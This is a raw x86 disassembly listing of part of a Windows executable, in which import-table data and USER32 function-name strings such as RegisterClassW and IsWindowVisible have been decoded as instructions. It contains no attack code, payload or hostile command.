  41232e:	add    DWORD PTR [eax],eax
  412330:	inc    esi
  412331:	add    DWORD PTR ss:[eax],eax
  412334:	push   eax
  412335:	add    DWORD PTR ss:[eax],eax
  412338:	pop    edx
  412339:	add    DWORD PTR ss:[eax],eax
  41233c:	fs add DWORD PTR ss:[eax],eax
  412340:	outs   dx,BYTE PTR ds:[esi]
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	xor    BYTE PTR [esi],0x1
  412347:	add    BYTE PTR [edx+0x136],dl
  41234d:	add    BYTE PTR [eax],al
  41234f:	add    BYTE PTR [eax-0x3ffffeca],ch
  412355:	add    DWORD PTR ss:[eax],eax
  412358:	fdiv   DWORD PTR [esi]
  41235a:	add    DWORD PTR [eax],eax
  41235c:	hlt    
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	or     al,0x37
  412362:	add    DWORD PTR [eax],eax
  412364:	and    al,0x37
  412366:	add    DWORD PTR [eax],eax
  412368:	add    BYTE PTR [eax],al
  41236a:	add    BYTE PTR [eax],al
  41236c:	inc    esi
  41236d:	aaa    
  41236e:	add    DWORD PTR [eax],eax
  412370:	pop    esp
  412371:	aaa    
  412372:	add    DWORD PTR [eax],eax
  412374:	jo     0x4123ad
  412376:	add    DWORD PTR [eax],eax
  412378:	jle    0x4123b1
  41237a:	add    DWORD PTR [eax],eax
  41237c:	mov    dh,BYTE PTR [edi]
  41237e:	add    DWORD PTR [eax],eax
  412380:	cwde   
  412381:	aaa    
  412382:	add    DWORD PTR [eax],eax
  412384:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412385:	aaa    
  412386:	add    DWORD PTR [eax],eax
  412388:	mov    ah,0x37
  41238a:	add    DWORD PTR [eax],eax
  41238c:	les    esi,FWORD PTR [edi]
  41238e:	add    DWORD PTR [eax],eax
  412390:	into   
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	fidiv  DWORD PTR [edi]
  412396:	add    DWORD PTR [eax],eax
  412398:	repnz aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	push   es
  41239d:	cmp    BYTE PTR [ecx],al
  41239f:	add    BYTE PTR [eax],bl
  4123a1:	cmp    BYTE PTR [ecx],al
  4123a3:	add    BYTE PTR [eax],ch
  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
